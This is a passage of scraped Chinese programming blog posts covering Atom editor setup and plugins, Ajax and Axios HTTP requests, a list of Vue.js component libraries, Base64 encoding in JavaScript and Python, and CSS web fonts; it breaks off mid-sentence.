上开源的代码编辑器。立即前往\n1.1 优缺点 主要优点\n开发维护团队强大，开源项目，修复 Bug 速度快，生态圈成长速度快。 快捷键支持特别好，熟悉了各种快捷键后可以成倍提高生成效率。 比较稳定，很少出现崩溃。 插件管理很到位，能准确定位出问题的插件。 插件的生态圈发展速度特别快，很多好用的插件。 主要缺点\n性能问题，启动速度很慢。 打开大文件是会出现 CPU 占用过高的问题。 目前相比于 Sublime 技术层面还不够成熟，有不少 Bug。 2. 基本使用和配置 2.1 更换源 初次使用Atom的插件系统，APM 需要做一些初始化工作，比如，安装一些相关的依赖包。由于国内网络问题，会导致安装失败或很慢，需要更换为国内的镜像源：\n将 C:\\Users\\Yourname\\.atom\\.apm\\.apmrc 拷贝到 C:\\Users\\Yourname\\.atom\\目录下 编辑 C:\\Users\\Yourname\\.atom\\.apmrc，新增如下内容： 1 registry=https://registry.npm.taobao.org/ 2.2 技术原理 Atom 是基于Electron，而Electron 是 Chromium 与 Node.js 的集成，它可以访问本地用户界面，包括本地对话框、菜单和窗口控件。\n使用 Chromium 浏览网页时，每一个标签页和插件都对应着一个操作系统中的进程。在 Electron 中也沿用了这样的架构，Electron 程序的入口点是一个 JavaScript 文件，这个文件将会被运行在一个只有 Node.js 环境的主线程中。\n目前，已经有大量基于 Electron 的应用：\nVS Code 是微软的一款文本编辑器。 Slack 是一款即时通讯软件。 Postman 是一个 HTTP API 调试工具。 Hyper 是一个终端仿真器。 Nylas N1 是一个邮件客户端。 GitKraken 是一个 Git 的 GUI 客户端。 Medis 是一个 Redis 的 GUI 客户端。 Mongotron 是一个 MongoDB 的 GUI 客户端。 Atom 核心仅仅提供API，功能全部由插件来实现，Atom 默认就捆绑了 77 个插件。\n2.3 插件安装方法 GUI 安装 打开Atom \u0026raquo; Packages \u0026raquo; Settings View \u0026raquo; Install Packages/Themes然后在 \u0026ldquo;Search packages\u0026rdquo; 中输入你想要的插件，例如：simplified-chinese-menu，点击 \u0026ldquo;Install\u0026rdquo;。\n下载安装 到 github.com 上搜索插件名，下载相应源代码压缩包。解压后，移动到 C:\\Users\\Yourname\\.atom\\packages\n命令行安装 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // 安装指定包 apm install \u0026lt;package_name\u0026gt; // 安装指定版本的包 apm install \u0026lt;package_name\u0026gt;@\u0026lt;package_version\u0026gt; // 查找包 apm search \u0026lt;package_name\u0026gt; // 查看包更多详情 apm view \u0026lt;packge_name\u0026gt; // 查看当前已安装包(包含默认Atom捆绑和个人安装) apm list 3. 插件 3.1 通用插件 sync-settings：配置备份插件，方便以后的迁移，配合gist实用快捷。 simplified-chinese-menu：Atom的汉化插件。 atom-beautify：代码格式化。 autocomplete-modules：模块名自动补全。 autocomplete-paths：文件路径自动提示。 hyperclick：跳转到变量函数声明或者定义的地方。 markdown-format，markdown-writer：Atom 上写 Markdown。 markdown-preview-plus：Markdown预览。 project-manager：Atom 上管理项目。 vim-mode：Atom 添加 Vim 模式。 atom-terminal-panel：Atom 内置命令行工具。 platformio-ide-terminal：终端工具。 file-icons：不同类型的文件显示不同的文件图标。 script：执行脚本。 docblockr：方便写注释，可以根据情况生成不同的注释格式。 activate-power-mode：打字特效。 minimap：显示当前文档的缩略图。 open-unsupported-files：使用系统软件打开 Doc、Excel、PPT等 Atom 不预览的文件。 minimap-highlight-selected：选中时，高亮相同的文本。 3.2 Git/SVN 插件 tortoise-svn：Svn插件。 git-plus：在 Atom 里面执行 git 命令。 git-control：Git面板。 git-log：图形化 Git 提交记录。 atomatigit：可视化 Git 操作。 tree-view-git-status：文件夹 Git 状态。 3.3 HTML 插件 atom-html-preview：Atom编辑器内实时预览 HTML 的工具。 autoclose-html：自动闭合 HTML 标签。 emmet：html补全，加快 Web 开发速度，提供 Snippet 。 3.4 CSS 插件 color-picker：取色器。 autoprefixer：浏览器兼容。 linter-scss-lint：SCSS 编码规范检查。 linter-less：LESS 编码规范检查。 linter-csslint：CSS 编码规范检查。 3.5 JavaScript 插件 jquery-snippets：Jquery 自动补全 Snippets。 linter-jshint：jshint 代码检查。 javascript-snippets：JavaScript 自动补全 Snippets。 atom-ternjs: JavaScript 代码智能提示补全。 3.6 Python 插件 atom-python-run：终端运行 Python 代码。 autocomplete-python：Python 代码自动补全。 linter-pep8：PEP8 编码规范检查。 linter-flake8：Flake8 编码规范检查。 python-tools：提供了强大变量名函数和标准库的补全。 python-debugger：Python 调试工具。 atom-django：Atom 对 Django 框架的支持。 django-templates: Atom 对 Django templates 模板支持。 language-mako：Atom 对Mako 模板支持。 4. 快捷键 英文 中文 快捷键 功能 New Window 新建界面窗口 Ctrl + Shift + N 如中文意思 New File 新建文件 Ctrl + N 如中文意思 Open File 打开文件 Ctrl + O 如中文意思 Open Folder 打开文件夹 Ctrl + Shift + O 如中文意思 Add Project Folder 加载项目目录 Ctrl + Alt + O 如中文意思 Reopen Last Item 重新加载上次项目 Ctrl + Shift + T 如中文意思 Save 保存文件 Ctrl + S 如中文意思 Save As 另存为 Ctrl + Shift +S 如中文意思 Close Tab 关闭当前编辑文档 Ctrl + W 如中文意思 Close Window 关闭编辑器 Ctrl + Shift + W 如中文意思 Undo 撤销 Ctrl + Z 如中文意思 Redo 重做 Ctrl + Y 如中文意思 Cut 剪切 Shift + Delete 如中文意思 Copy 复制 Ctrl + Insert 如中文意思 Copy Path 复制文档路径 Ctrl + Shift + C 如中文意思 Paste 粘贴 Shift + Insert 如中文意思 Select All 全选 Ctrl + A 如中文意思 Select Encoding 选择编码 Ctrl + Shift +U 就是设置文件的编码 Go to Line 跳转到某行 Ctrl + G 支持行列搜索,Row:Column Slect Grammar 语法选择 Ctrl + Shift + L 和Sublime的Syntax设置功能一样 Reload 重载 Ctrl+ Alt +R 重新载入当前编辑的文档 Toggle Full Screen 全屏 F11 如中文意思 Increase Font Size 增大字体 Ctrl + Shift + “+” Sublime的Ctrl +也能生效 Decrease Font Size 减小字体 Ctrl + Shift + “-“ Sublime的Ctrl -也能生效 Toggle Tree View 展示隐藏目录树 Ctrl +|（竖杠） Ctrl+b可以隐藏不能展示 Toggle Commadn palette 全局搜索面板 Ctrl + Shift + P 和Sublime的大同小异 Select Line 选定一行 Ctrl + L 如中文意思 Select First Character of Line 选定光标至行首 Shift + Home 如中文意思 End of Line 选定光标至行尾 Shift + End 如中文意思 Select to Top 选定光标处至文档首行 Ctrl + Shift + Home 就是光标处作为分割线,取文档上部分 Select to Bottom 选定光标处至文档尾行 Ctrl + Shfit + End 就是光标处作为分割线,取文档下部分 Find in Buffer 从缓存器搜索 Ctrl + F 与Sublime一致 Replace in Buffer 高级替换 Ctrl + Shift + F 与Sublime一致 Select Next 匹配选定下一个 Ctrl + D 和Sublime一模一样有木有 Select All 匹配选定所有 Alt + F3 和Sublime一模一样有木有 File 查询文件,选定打开 Ctrl + P 与Sublime不一样 Delte End of Word 删除光标处至词尾 Ctrl + Del 如中文意思 Duplicate Line 复制行 Ctrl + Shift + D 复制光标所在行自动换行 Delete Line 删除一行 Ctrl + Shift + K 如中文意思 Toggle Comment 启用注释 Ctrl + / 与Sublime一致 Toggle developer tools 打开Chrome调试器 Ctrl + Alt + I 挺神奇的 Indent 增加缩进 Ctrl + [ 向右缩进 Outdent 减少缩进 Ctrl + ] 向左缩进 Move Line Up 行向上移动 Ctrl + up 如字面意思 Move Line Down 行向下移动 Ctrl + Down 如字面意思 Join Lines 行链接 Ctrl + J 追加 newline-below 光标之下增加一行 Ctrl + Enter 与sublime一致 editor:newline-above 光标之上增加一行 Ctrl + Shift + Enter 与sublime一致 pane:show-next-item 切换编辑的标签页 Ctrl + Tab 如中文意思 Fuzzy Finder 文件跳转面板 Ctrl + T 如字面意思 Select Line Move above 选中行上移 Ctrl + up 如中文意思 Select Line Move below 选中行下移 Ctrl + down 如中文意思 Symbol-view 进入变量、函数跳转面板 Ctrl + R 如中文意思 5. 最佳实践 5.1 同步插件和配置 这里主要使用了 sync-setting 插件和 Github 提供的 Gist 代码片段服务。\n1.创建 Gist 项目，成功后，在项目的 URL 中，获取 Gist id。立即前往 2.申请 Access Tokens。立即前往 3.配置 sync-settings。在 Atom 的配置文件 config.cson 新增如下内容： C:\\Users\\Yourname\\.atom\\config.cson\n1 2 3 \u0026#34;sync-settings\u0026#34;: gistId: \u0026#34;b3025...88c41c\u0026#34; personalAccessToken: \u0026#34;6a10cc207b....7a67e871\u0026#34; 6. 参考 https://marshal.ohtly.com/2016/07/16/using-atom-as-a-python-editor/ https://atom.io/docs https://github.com/futantan/atom https://atom.io/packages/sync-settings https://zhuanlan.zhihu.com/p/23536047 ","description":"","id":516,"section":"post","tags":["博文","工具","开发"],"title":"程序员的编辑器 - Atom","uri":"https://www.chenshaowen.com/blog/programming-editor-atom.html"},{"content":"1. 基本概念 1.1 Ajax Ajax 全称为 \u0026quot; Asynchronous JavaScript and XML \u0026ldquo;（异步 JavaScript 和 XML ）。其核心由 JavaScript、XmlHttpRequest 、DOM 对象组成，通过 XmlHttpRequest 对象，向服务器发送异步请求，从服务器获得数据，然后用 JavaScript 来操作 DOM 而更新页面。\n以 Jquery 为例：\n1 2 3 4 5 6 7 8 9 10 $.ajax({ type: \u0026#34;GET\u0026#34;, url: \u0026#34;/api/user/\u0026#34;, async: false, dataType: \u0026#34;json\u0026#34;, data: {}, success: function (res) { //请求成功后的回调操作 }, }); 常见参数说明：\n属性参数：\ntype：请求方法，post、get、put、delete 等，默认为 get。 url：发送请求的地址，String 类型的参数，默认为当前页地址。 timeout：设置请求超时时间，Number 类型的参数，单位，毫秒。 async：是否为异步请求，Boolean 类型的参数，默认设置为 true。 cache：是否缓存，Boolean 类型的参数，默认为 true，当 dataType 为 script 或 jsonp 时，默认为 false。 data：请求的参数，Object 或 String 类型的参数。 dataType：预期服务器返回的数据类型，String 类型的参数，xml、html、script、json、jsonp、text 之一。 contentType：编码类型，默认为 \u0026ldquo;application/x-www-form-urlencoded\u0026rdquo;。 回调参数：\nbeforeSend：发送请求前调用的函数。 complete：请求完成后调用的函数。 success：请求成功后调用的函数。 error：请求失败时被调用的函数。 最后，Jquery 提供了一个全局设置函数，$.ajaxSetup，用于统一处理某些操作。\n1.2 XMLHttpRequest XMLHttpRequest 用于在后台与服务器交换数据。页面加载后，在后台向服务器发送数据，不需要重新加载页面就可以更新页面。\n先看个示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 var xhr = new XMLHttpRequest(); xhr.open(\u0026#34;GET\u0026#34;, \u0026#34;/api/user/\u0026#34;, true); // 第三个参数，是否异步 xhr.onreadystatechange(); { if (xhr.readyState == 4 \u0026amp;\u0026amp; xhr.status == 200) { var res = xhr.responseText; //请求成功后的回调操作 } } xhr.send(null); // null表示参数为空 方法：\nopen：初始化请求。 send：发送请求。 abort：忽略 XmlHttp 对象，重新回到未初始化状态，也意味着终止请求。 setRequestHead：设置请求的报头，例如请求的编码格式。 getResponseHead：获取响应的指定报头。 getAllResponseHead：获取响应的全部报头。 属性：\nreadyState ：工作状态 0 (未初始化)、 1 (初始化)、 2 (发送数据)、 3 (数据传送中) 、 4 (完成) 共 5 个值。 status：存放响应的状态码。 statusText：存放响应状态码的简短描述。 responseText：存放响应的文本，以文本方式存放。 responseXML：存放响应的 XML 文档模式对象，如果返回的是文本些值为 null. 回调：\nonreadystatechange：当 state 状态发生改变时，调用的函数。 2. Axios Axios 是一个基于 Promise 用于浏览器和 Nodejs 的 HTTP 客户端，它本身具有以下特征：\n支持 Promise API 拦截请求和响应 转换请求和响应数据 取消请求 自动转换 JSON 数据 客户端支持防止 CSRF/XSRF 2.1 使用方法别名 先看个示例：\n1 2 3 4 5 6 7 8 axios .get(\u0026#34;/api/user/\u0026#34;) .then(function (res) { console.log(res); }) .catch(function (error) { console.log(error); }); 可用的别名：\naxios.request（config） axios.get（url [，config]） axios.delete（url [，config]） axios.head（url [，config]） axios.post（url [，data [，config]]） axios.put（url [，data [，config]]） axios.patch（url [，data [，config]]） ###2.2 使用配置方法\n先看个示例\n1 2 3 4 axios({ method: \u0026#34;get\u0026#34;, url: \u0026#34;/api/user/\u0026#34;, }); 2.3 参数配置 url： 用来向服务器发送请求的 url 。 method ： 请求方法，默认是 get 方法。 baseURL ： 基础 URL 路径，假如 url 不是绝对路径，http://domain.com/api/login?name=jack ，那么向服务器发送请求的 URL 将会是 baseURL + url。 transformRequest： transformRequest 方法允许在请求发送到服务器之前修改该请求，此方法只适用于 PUT、POST 和 PATCH 方法中。而且，此方法最后必须返回一个 string、ArrayBuffer 或者 Stream。 transformResponse： transformResponse 方法允许在数据传递到 then、catch 之前修改 response 数据。此方法最后也要返回数据。 headers ： 发送自定义 Headers 头文件，头文件中包含了 http 请求的各种信息。 params ： params 是发送请求的查询参数对象，对象中的数据会被拼接成 url?param1=value1\u0026amp;param2=value2。 paramsSerializer ： params 参数序列化器。 data ： data 是在发送 POST、PUT 或者 PATCH 请求的数据对象。 timeout ： 请求超时设置，单位为毫秒. withCredentials ： 表明是否有跨域请求需要用到证书. adapter ： adapter 允许用户处理更易于测试的请求。返回一个 Promise 和一个有效的 response. auth ： auth 表明提供凭证用于完成 http 的身份验证。这将会在 headers 中设置一个 Authorization 授权信息。自定义 Authorization 授权要设置在 headers 中。 responseType： 表示服务器将返回响应的数据类型，有 arraybuffer、blob、document、json、text、stream 这 6 个类型，默认是 json 类似数据。 xsrfCookieName ： 用作 xsrf token 值的 cookie 名称。 xsrfHeaderName ： 带有 xsrf token 值 http head 名称。 onUploadProgress ：允许在上传过程中的做一些操作。 onDownloadProgress： 允许在下载过程中的做一些操作。 maxContentLength：定义了接收到的 response 响应数据的最大长度。 validateStatus ：validateStatus 定义了根据 HTTP 响应状态码决定是否接收或拒绝获取到的 promise。如果 validateStatus 返回 true （或设置为 null 或 undefined ），promise 将被接收；否则，promise 将被拒绝。 maxRedirects ： maxRedirects 定义了在 Node.js 中 redirect 的最大值，如果设置为 0 ，则没有 redirect 。 httpAgent ： 定义在使用 http 请求时的代理。 httpsAgent ： 定义在使用 https 请求时的代理。 proxy ： proxy 定义代理服务器的主机名和端口。 cancelToken ：cancelToken 定义一个 cancel token 用于取消请求。 2.4 并发方法 Axios 支持并发的传输数据。\naxios.all（iterable） axios.spread（callback） 1 2 3 4 5 6 7 8 axios.all([ axios.get(\u0026#39;http://domain.com/api/user/\u0026#39;); axios.get(\u0026#39;http://domain.com/api/fruit/\u0026#39;); ]) .then(axios.spread(function (userResponse, fruitResponse) { console.log(\u0026#39;User\u0026#39;, userResponse.data); console.log(\u0026#39;Fruit\u0026#39;, fruitResponse.data); })); 2.5 创建一个实例 可以使用自定义设置创建一个实例，进行特定的配置，持续的使用这个实例请求数据。\n1 2 3 4 5 var instance = axios.create({ baseURL: \u0026#34;http://domain.com/api/\u0026#34;, timeout: 1000, headers: { \u0026#34;X-Custom-Header\u0026#34;: \u0026#34;myself_header\u0026#34; }, }); 2.6 全局配置 axios 支持全局默认设置\n1 2 3 4 axios.defaults.baseURL = \u0026#34;http://domain.com/api/\u0026#34;; axios.defaults.headers.common[\u0026#34;Authorization\u0026#34;] = AUTH_TOKEN; axios.defaults.headers.post[\u0026#34;Content-Type\u0026#34;] = \u0026#34;application/x-www-form-urlencoded\u0026#34;; 2.7 Axios 与 Jquery 比较 Axios 支持 Node.js，Jquery 不支持 Axios 是基于 Promise 语法标准的网络请求库，相比于 Jquery 更加小巧专业。 3. 参考 https://github.com/mzabriskie/axios ","description":"","id":517,"section":"post","tags":["博文","前端","工具","Axios","Ajax","API"],"title":"Axios ajax","uri":"https://www.chenshaowen.com/blog/axios-ajax.html"},{"content":"1. UI组件 element - 饿了么出品的Vue2的web UI工具套件 Vux - 基于Vue和WeUI的组件库 iview - 基于 Vuejs 的开源 UI 组件库 mint-ui - Vue 2的移动UI元素 muse-ui - 三端样式一致的响应式 UI 库 vue-material - 通过Vue Material和Vue 2建立精美的app应用 vuetify - 为移动而生的Vue JS 2组件框架 Keen-UI - 轻量级的基本UI组件合集 vonic - 快速构建移动端单页应用 vue-multiselect - Vue.js选择框解决方案 eme - 优雅的Markdown编辑器 vueAdmin - 基于vuejs2和element的简单的管理员模板 bootstrap-vue - 应用于Vuejs2的Twitter的Bootstrap 4组件 Vue.Draggable - 实现拖放和视图模型数组同步 eagle.js - hacker的幻灯片演示框架 vue-awesome-swiper - vue.js触摸滑动组件 vue-table - 简化数据表格 vue-chat - vuejs和vuex及webpack的聊天示例 vue-blu - 帮助你轻松创建web应用 vue-recyclerview - 管理大列表的vue-recyclerview VueCircleMenu - 漂亮的vue圆环菜单 vue-infinite-scroll - VueJS的无限滚动指令 buefy - 响应式UI组件轻量级库 vue-beauty - 由vue和ant design创建的优美UI组件 vue-waterfall - Vue.js的瀑布布局组件 radon-ui - 快速开发产品的Vue组件库 vue-loop - 无限的内容循环 vue-chartjs - vue中的Chartjs的封装 vue-carbon - 基于 vue 开发MD风格的移动端 vue-syntax-highlight - Sublime Text语法高亮 vue-echarts - VueJS的ECharts组件 vue-quill-editor - 基于Quill适用于Vue2的富文本编辑器 vue-amap - 基于Vue 2和高德地图的地图组件 vue-calendar - 日期选择插件 vue-infinite-loading - VueJS的无限滚动插件 2. 开发框架 vue.js - 流行的轻量高效的前端组件化方案 vue-admin - Vue管理面板框架 quasar - 响应式网站和混合移动应用程序 electron-vue - Electron及VueJS快速启动样板 vue-element-admin - vue2管理系统模板 vuepack - 现代VueJS启动器 N3-components - 快速构建页面和应用 VueThink - 前后端分离框架 vue-2.0-boilerplate - Vue2单页应用样板​ vue-spa-template - 前后端分离后的单页应用开发 3. 实用库 vuex - 专为 Vue.js 应用程序开发的状态管理模式 vue-loader - Vue.js 针对Webpack的组件装载插件 vue-validator - vue的验证器插件 vue-lazyload - 用于懒加载的Vue模块 vuelidate - 简单轻量级的基于模块的Vue.js验证 vue-i18n - VueJS的多语言切换插件 qingcheng - qingcheng主题 Vue-Socketio - VueJS的socketio实现 vue-awesome - VueJS字体Awesome组件 vue-desktop - 创建管理面板网站的UI库 vue-axios - 将axios整合到VueJS的封装 vue-meta - 管理app的meta信息 vue-head - head标签的meta信息操作 meteor-vue-component - vue和meteor整合 avoriaz - VueJS测试实用工具库 portal-vue - 在组件外部渲染DOM vue-flatpickr - 封装Flatpickr的Vue组件 4. 服务端 nuxt.js - 用于服务器渲染Vue app的最小化框架 unvue - 使用简单的通用VueJS应用 express-vue - 简单的使用服务器端渲染vue.js 5. 辅助工具 vue-play - 展示Vue组件的最小化框架 DejaVue - Vuejs可视化及压力测试 vscode-VueHelper - 目前vscode最好的vue代码提示插件 vue-generate-component - 轻松生成Vue js组件的CLI工具 6. 应用实例 koel - 基于网络的个人音频流媒体服务 pagekit - 轻量级的CMS建站系统 vue-manage-system - 后台管理系统解决方案 vuedo - 博客平台 jackblog-vue - 个人博客系统 PJ Blog - 开源博客 vue-cnode - 重写vue版cnode社区 vms - vuejs2管理系统 CMS-of-Blog - 博客内容管理器 7. Demo 示例 vue2-elm - 重写饿了么webapp Vue-cnodejs - 基于vue重写Cnodejs.org的webapp NeteaseCloudWebApp - 高仿网易云音乐的webapp vue2-happyfri - vue2及vuex的入门练习项目 vue-zhihu-daily - 知乎日报 with Vuejs vue2-demo - 从零构建vue2 + vue-router + vuex 开发环境 vue-wechat - vue.js开发微信app界面 eleme - 高仿饿了么app商家详情 vue-demo - vue简易留言板 bilibili-vue - 全栈式开发bilibili首页 spa-starter-kit - 单页应用启动套件 VueDemo_Sell_Eleme - Vue2高仿饿了么外卖平台 vue-music - Vue 音乐搜索播放 douban - 基于vue全家桶的精致豆瓣DEMO vue-Meizi - vue最新实战项目 maizuo - vue/vuex/redux仿卖座网 vue-WeChat - 基于Vue2高仿微信App的单页应用 vue-demo-kugou - vuejs仿写酷狗音乐webapp vue2-manage - 基于 vue + element-ui 的后台管理系统 zhihudaily-vue - 知乎日报web版 vue-163-music - vue仿网易云音乐客户端版 vue-axios-github - 登录拦截登出功能 douban - 模仿豆瓣前端 vue-shopping - 蘑菇街移动端 vue2.0-taopiaopiao - vue2.0与express构建淘票票页面 xyy-vue - 大学生交流平台 easy-vue - 使用Vue实现简易web vue2.x-douban - Vue2实现简易豆瓣电影webApp vue2-MiniQQ - 基于Vue2实现的仿手机QQ单页面应用 mi-by-vue - VueJS仿小米官网 daily-zhihu - 基于Vue2的知乎日报单页应用 vue-leancloud-blog - 一个前后端完全分离的单页应用 8. 参考 https://github.com/opendigg/awesome-github-vue ","description":"","id":518,"section":"post","tags":["整理","前端","工具","组件","Vuejs","转载"],"title":"Vue.js  组件库","uri":"https://www.chenshaowen.com/blog/vuejs-component-library.html"},{"content":"1. 应用场景 1.1 Mail 由于 RFC821 要求邮件内容必须为 ASCII 码。当邮件中有其他的非ASCII字符或二进制数据时，就需要 Content-Transfer-Encoding，Base64是其中的一种方法。\n1.2 URL 有些应用需要把二进制数据放到URL里，而URL只允许特定的一些ASCII字符。这时，也需要用到Base64编码。当然，这也只是对数据本身的编码，编码后的数据里面可能包含+/，真正放到URL里面时候，还需要 URL-Encoding，变成%XX模式。\n1.3 HTML中内嵌图片 这种方式是将图片编码为 Base64 字符串放到 HTML 页面。当HTML页面加载完成之后，图片数据也就加载完了，而不需要单独发HTTP 请求。\ndata: URI定义于IETF标准的RFC 2397。基本使用格式如下：\n1 data:[\u0026lt;MIME-type\u0026gt;][;base64|charset=some_charset],\u0026lt;data\u0026gt; MIME-type 是嵌入数据的 MIME 类型，比如 PNG图片就是 image/png。如果紧接着是base64，那么说明后面的 data 采用Base64编码。\n1.4 数字证书签名 CER、CRT、PEM、KEY证书，这一类证书为Base64编码的格式。\n1.5 去可视化化处理 不推荐 Base64 用于加密，但是有些场景仅仅需要将一个简单的字符串，转换成不可识别的字符串。比如，Cookie、Signature 参数等。还有些博客使用 Base64 编码邮箱地址，避免收到垃圾邮件。\n2. Base64 原理 2.1 Base64 编码 Base64编码要求把3个8位字节（38=24）转化为4个6位的字节（46=24），之后在6位的前面补两个0，形成8位一个字节的形式。当原数据不是3的整数倍时，如果最后剩下两个输入数据，在编码结果后加1个“=；如果最后剩下一个输入数据，编码结果后加2个“=；如果没有剩下任何数据，就什么都不要加。\n2.2 Base64解码 解码是编码的逆过程，去掉尾部 =，按 8 位展开，如果不是 8 的整数倍，末尾补 0，转换为ASCII编码即可。\n3. 前端 JavaScript 实现 这里主要使用的是 js-base64 项目提供的库函数。\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;script src=\u0026#34;base64.js/2.1.9/base64.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; Base64.encode(\u0026#39;有意思\u0026#39;); // 5pyJ5oSP5oCd Base64.decode(\u0026#39;5pyJ5oSP5oCd\u0026#39;); // 有意思 Base64.encode(\u0026#39;/user/?name=test\u0026#39;); // L3VzZXIvP25hbWU9dGVzdA== Base64.decode(\u0026#39;L3VzZXIvP25hbWU9dGVzdA==\u0026#39;); // /user/?name=test Base64.encodeURI(\u0026#39;/user/?name=test\u0026#39;); // L3VzZXIvP25hbWU9dGVzdA Base64.decode(\u0026#39;L3VzZXIvP25hbWU9dGVzdA\u0026#39;); // /user/?name=test \u0026lt;/script\u0026gt; 4. 后端 Python 实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026gt; ipython In [1]: import base64 In [2]: base64.b64encode(\u0026#39;ascii_string\u0026#39;) Out [2]:\u0026#39;YXNjaWlfc3RyaW5n\u0026#39; In [3]: base64.b64decode(\u0026#39;YXNjaWlfc3RyaW5n\u0026#39;) Out [3]:\u0026#39;ascii_string\u0026#39; In [4]: base64.b64encode(u\u0026#39;有意思\u0026#39;.encode(\u0026#39;utf-8\u0026#39;)) Out [4]:\u0026#39;5pyJ5oSP5oCd\u0026#39; In [5]: print base64.b64decode(\u0026#39;5pyJ5oSP5oCd\u0026#39;).decode(\u0026#39;utf-8\u0026#39;) Out [5]:\u0026#39;有意思\u0026#39; 处理中文时，需要注意的是：由于Python base64 库按照 RFC 3548 实现，仅能处理 Byte 和 ASCII 字符。解决办法是：先把 Unicode 字符转换成 Byte 就可以了。\n处理流程： Unicode -\u0026gt; Byte string -\u0026gt; Base64 String -\u0026gt; Byte String -\u0026gt; Unicode\n由于标准的 Base64 编码后可能出现字符 + 和 / ，在 URL 中就不能直接作为参数，所以又有一种 \u0026ldquo;url safe\u0026rdquo; 的 Base64 编码，其实就是把字符 + 和 / 分别变成 - 和 _ ：\n1 2 3 4 5 6 7 8 In[1]: base64.b64encode(\u0026#39;i\\xb7\\x1d\\xfb\\xef\\xff\u0026#39;) Out[1]: \u0026#39;abcd++//\u0026#39; In[2]: base64.urlsafe_b64encode(\u0026#39;i\\xb7\\x1d\\xfb\\xef\\xff\u0026#39;) Out[2]: \u0026#39;abcd--__\u0026#39; In[3]: base64.urlsafe_b64decode(\u0026#39;abcd--__\u0026#39;) Out[3]: \u0026#39;i\\xb7\\x1d\\xfb\\xef\\xff\u0026#39; 5. 参考 https://github.com/dankogai/js-base64 ","description":"","id":519,"section":"post","tags":["整理","前端","编码","数据","Base64"],"title":"Base64 编码","uri":"https://www.chenshaowen.com/blog/base64-code.html"},{"content":"1. Font-family 网页上能使用的字体，限制在浏览器所在PC已经安装的几款字体。\nWindows操作系统，中文字体：\n黑体：SimHei 宋体：SimSun 新宋体：NSimSun 仿宋：FangSong 楷体：KaiTi 仿宋GB2312：FangSongGB2312 楷体GB2312：KaiTiGB2312 微软雅黑：Microsoft YaHei OS X操作系统，中文字体：\n冬青黑体: Hiragino Sans GB 华文细黑：STXihei 华文黑体：STHeiti 华文楷体：STKaiti 华文宋体：STSong 华文仿宋：STFangsong 这样会引出一个问题：如何让页面呈现可预期的字体？\nfont-family 通过指定多种字体，提供这样的功能。优先使用排在前面的字体，当找不到前面的字体时，使用下一个字体。下面的 CSS 指定了在 Windows 下显示微软雅黑，在 OS X 上显示华文细黑字体。\n1 font-family:\u0026#34;Microsoft YaHei\u0026#34;, STXihei 为了保证兼容性，在 font-family 中，通常同时写入英文和中文名，例如：font-family：\u0026ldquo;Microsoft YaHei\u0026rdquo; , \u0026ldquo;微软雅黑\u0026rdquo; , STXihei，\u0026ldquo;华文细黑\u0026rdquo;。\n2. Font-face @font-face 语句是 css 中的一个功能模块，用于实现网页字体多样性。设计者可随意指定字体，不需要考虑浏览器 PC 上是否安装该字体。\n缺点是，字体文件的体积可能非常的大，而且需要额外的HTTP连接，这些都会降低网站页面的加载速度。\n2.1 语法规则 语法规则：\n1 2 3 4 5 6 @font-face { font-family: \u0026lt;YourDefineFontName\u0026gt;; src: \u0026lt;url\u0026gt; [\u0026lt;format\u0026gt;],[\u0026lt;source\u0026gt; [\u0026lt;format\u0026gt;]], *; [font-weight: \u0026lt;weight\u0026gt;]; [font-style: \u0026lt;style\u0026gt;]; } 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 /* 引入字体 */ @font-face { font-family: \u0026#39;defineName\u0026#39;; src: url(\u0026#39;../fonts/singlemalta-webfont.eot\u0026#39;); src: url(\u0026#39;../fonts/singlemalta-webfont.eot?#iefix\u0026#39;) format(\u0026#39;embedded-opentype\u0026#39;), url(\u0026#39;../fonts/singlemalta-webfont.woff\u0026#39;) format(\u0026#39;woff\u0026#39;), url(\u0026#39;../fonts/singlemalta-webfont.ttf\u0026#39;) format(\u0026#39;truetype\u0026#39;), url(\u0026#39;../fonts/singlemalta-webfont.svg#defineName\u0026#39;) format(\u0026#39;svg\u0026#39;); font-weight: normal; font-style: normal; } /* 使用字体 */ body { font-family: defineName; } 需要注意的是，src资源有两种写法：\n一种是相对路径，../font/abc.ttf 一种是绝对路径，//font.abc.com/static/abc.ttf 2.2 兼容性 IE6-8，仅支持 Embedded-OpenType（.eot） firefox3.5，支持 TrueType（.ttf）、OpenType（.otf） firefox3.6，支持 TrueType（.ttf）、OpenType（.otf）、WOFF（.woff） chrome，支持 TrueType（.ttf）、OpenType（.otf）、WOFF（.woff）、SVG（.svg） safari，支持 TrueType（.ttf）、OpenType（.otf）、WOFF（.woff）、SVG（.svg） opera，支持 TrueType（.ttf）、OpenType（.otf）、WOFF（.woff）、SVG（.svg） 2.3 示例 Bola-Ocho-ffp.ttf go3v2.ttf 3. 网络字体文件格式 目前最主要的几种网络字体(web font)格式包括WOFF，SVG，EOT，OTF/TTF。\nWOFF，Web Open Font Format 这种字体格式专门用于网上，由Mozilla联合其它几大组织共同开发。WOFF字体通常比其它字体加载的要快些，因为使用了OpenType (OTF)和TrueType (TTF)字体里的存储结构和压缩算法。这种字体格式还可以加入元信息和授权信息。这种字体格式有君临天下的趋势，因为所有的现代浏览器都开始支持这种字体格式。\nSVG / SVGZ，Scalable Vector Graphics (Font) SVG是一种用矢量图格式改进的字体格式，体积上比矢量图更小，适合在手机设备上使用。只有iPhone上的Safari(4.1)之前的版本支持它。目前火狐、IE都不支持SVG字体格式。火狐推迟对SVG字体的支持，重点放在WOFF格式上。SVGZ是压缩版的SVG。\nEOT，Embedded Open Type EOT是嵌入式字体，是微软开发的技术。允许OpenType字体用@font-face嵌入到网页并下载至浏览器渲染，存储在临时安装文件夹下。\nTTF， TrueType Font Windows和Mac系统最常用的字体格式，其最大的特点就是它是由一种数学模式来进行定义的基于轮廓技术的字体，这使得它们比基于矢量的字体更容易处理，保证了屏幕与打印输出的一致性。同时，这类字体和矢量字体一样可以随意缩放、旋转而不必担心会出现锯齿。\nOTF，OpenType，Font OpenType是微软和Adobe共同开发的字体，微软的IE浏览器全部采用这种字体。致力于替代TrueType字体。\n4. 字体下载 Google fonts Dafont Typekit dafont 还有一个小工具，以 Base64 的方式将字体文件嵌入 CSS 文件中。\n5. 自动载入使用的字体 5.1 Web Font Loader 简介 webfontloader项目由 Google 和 